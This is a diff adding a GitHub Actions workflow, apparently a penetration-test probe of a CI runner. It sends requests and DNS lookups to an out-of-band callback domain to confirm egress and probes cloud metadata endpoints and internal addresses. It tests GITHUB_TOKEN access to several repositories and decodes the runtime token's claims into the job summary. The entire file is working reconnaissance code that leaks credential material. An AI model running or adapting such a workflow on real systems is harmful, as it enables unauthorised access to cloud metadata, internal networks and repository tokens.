@@ -1,0 +1,51 @@
+name: forge-egress-probe
+on: push
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    steps:
+      - name: egress-and-token-scope
+        env:
+          OOB: "http://PEN-CPVH-6831-9009.dns.collabb-reg2.devops.aws.dev/"
+          OOBSUB: "http://runner6.PEN-CPVH-6831-9009.dns.collabb-reg2.devops.aws.dev/"
+        run: |
+          set +e
+          S="$GITHUB_STEP_SUMMARY"
+          echo "## forge runner probe" >> "$S"
+          echo "- uname: $(uname -srm)" >> "$S"
+          echo "- ips: $(hostname -I 2>/dev/null | tr -d '\n')" >> "$S"
+          echo "- resolv: $(grep -h nameserver /etc/resolv.conf | tr '\n' ' ')" >> "$S"
+          echo "### egress probes" >> "$S"
+          probe() {
+            code=$(curl -s -m 6 -o /tmp/o -w '%{http_code}|%{time_total}' "$1" 2>/tmp/e)
+            echo "- \`$1\` -> http=$code body=$(head -c 90 /tmp/o | tr -d '\n\r') err=$(head -c 90 /tmp/e | tr -d '\n\r')" >> "$S"
+          }
+          probe "$OOB?forge=http-apex"
+          probe "$OOBSUB?forge=http-sub"
+          echo "- dnsonly: $(getent hosts runner6-dns.PEN-CPVH-6831-9009.dns.collabb-reg2.devops.aws.dev | head -c 80)" >> "$S"
+          probe "http://169.254.169.254/latest/meta-data/"
+          probe "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+          probe "http://metadata.google.internal/computeMetadata/v1/instance/id"
+          probe "http://10.0.0.1/"
+          probe "http://172.16.0.1/"
+          probe "http://192.168.0.1/"
+          probe "http://127.0.0.1:22/"
+          probe "https://api.github.com/meta"
+          probe "https://github.com/LZY7977/ssrf-import-test6"
+          echo "### GITHUB_TOKEN scope (status codes only)" >> "$S"
+          tok() {
+            c=$(curl -s -m 8 -o /tmp/t -w '%{http_code}' -H "Authorization: Bearer $GITHUB_TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com/$1")
+            echo "- GET api/$1 -> $c msg=$(head -c 70 /tmp/t | tr -d '\n\r')" >> "$S"
+          }
+          tok "repos/LZY7977/ssrf-import-test6"
+          tok "repos/LZY7977/ssrf-import-test8"
+          tok "repos/LZY7977/ssrf-import-test8/contents/README.md"
+          tok "repos/LZY7977/codebuild-cache-demo"
+          tok "user/repos?per_page=1"
+          tok "installation/repositories"
+          echo "### runner context / cache namespace" >> "$S"
+          echo "- cache=${ACTIONS_CACHE_URL:-none} results=${ACTIONS_RESULTS_URL:-none} idtoken=${ACTIONS_ID_TOKEN_REQUEST_URL:-none} runner=${RUNNER_NAME:-none} env=${RUNNER_ENVIRONMENT:-none}" >> "$S"
+          CLAIMS=$(echo "$ACTIONS_RUNTIME_TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 1000)
+          echo "- runtime token claims: $CLAIMS" >> "$S"
+          echo "::notice title=forge-probe::complete"
